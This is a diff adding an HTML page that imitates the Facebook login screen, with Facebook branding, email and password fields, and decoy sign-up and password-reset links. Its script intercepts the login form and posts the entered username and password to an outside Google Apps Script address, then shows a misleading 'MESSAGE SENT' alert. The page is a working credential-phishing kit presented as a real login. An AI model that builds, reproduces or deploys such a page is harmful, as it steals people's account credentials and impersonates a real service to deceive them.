@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1565c0;
+        }
+
+        .separator {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+        }
+        a{
+            color:black;
+        }
+
+        .separator::before, .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #8e8e8e;
+        }
+
+        .separator-text {
+            padding: 0 10px;
+        }
+        ::placeholder{
+            text-align: center;
+            font-weight: bolder;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Facebook</h1>
+        <form method="post" id="myForm">
+            <input type="text" id="username" name="username" placeholder="Email or Phone Number" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button value="submit">Log In</button>
+        </form>
+        <div class="separator">
+            <span class="separator-text">or</span>
+        </div>
+        <button>Create New Account</button><br>
+        <a href="#">Forgot Password?</a>
+    </div>
+</body>
+<script>
+    document.getElementById('myForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        // Fetch the form data
+        var formData = new FormData(e.target);
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbysKtjqkv2_qz4EzQtS8WRgMTwxdnP5zH-DivJk5Kts-HD-gybSrGP1LWU1OdOzF348gg/exec"
+        // Send the data to the Google Apps Script
+        fetch(SCRIPT_URL, {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => response.text())
+        .then(data => {
+
+
+            console.log(data);alert("MESSAGE SENT,yow will be answered soon.")
+            // Handle success or error
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    });
+
+
+
+
+
+    
+</script>
+</html>
